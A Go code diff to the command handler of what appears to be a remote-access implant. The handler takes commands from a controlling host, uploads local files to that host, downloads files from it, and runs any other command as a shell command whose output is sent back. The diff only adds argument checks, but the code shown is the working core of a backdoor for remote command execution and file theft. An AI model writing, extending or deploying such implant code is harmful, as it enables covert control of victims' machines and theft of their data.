@@ -73,14 +73,22 @@ func ProcessCmd(client *http.Client, cmd string, host string) {
 		os.Exit(0)
 	} else if strings.HasPrefix(cmd, "upload") {
 		cmdTokens := strings.Split(cmd, " ")
-		localFilePath := cmdTokens[1]
-		remoteFilePath := cmdTokens[2]
-		UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
+		if len(cmdTokens) < 3 {
+			fmt.Println("[-] Invalid upload command syntax.")
+		} else {
+			localFilePath := cmdTokens[1]
+			remoteFilePath := cmdTokens[2]
+			UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
+		}
 	} else if strings.HasPrefix(cmd, "download") {
 		cmdTokens := strings.Split(cmd, " ")
-		remoteFilePath := cmdTokens[1]
-		localFilePath := cmdTokens[2]
-		DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
+		if len(cmdTokens) < 3 {
+			fmt.Println("[-] Invalid download command syntax.")
+		} else {
+			remoteFilePath := cmdTokens[1]
+			localFilePath := cmdTokens[2]
+			DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
+		}
 	} else {
 		out := ExecAndGetOutput(string(cmd))
 		fmt.Printf("[+] Sending back output:\n%s\n", string(out))
